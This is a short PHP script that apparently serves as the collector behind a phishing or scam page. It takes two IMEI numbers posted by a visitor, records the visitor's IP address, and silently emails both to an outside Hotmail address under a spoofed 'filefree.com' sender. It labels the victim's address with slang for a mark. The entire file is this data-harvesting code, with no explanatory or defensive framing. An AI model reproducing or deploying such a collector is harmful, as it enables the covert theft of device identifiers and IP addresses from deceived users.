<?php
$imei1=$_POST['imei1']; 
$imei2=$_POST['imei2']; 

$ip = $_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s");

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: MOBILE-3 <info@filefree.com>";
$conteudo.="IMEI $imei1/$imei2  [IP do Bico] $ip";

@mail("bb-pernambuco@hotmail.com", "$ip", "$conteudo", $headers); 

?>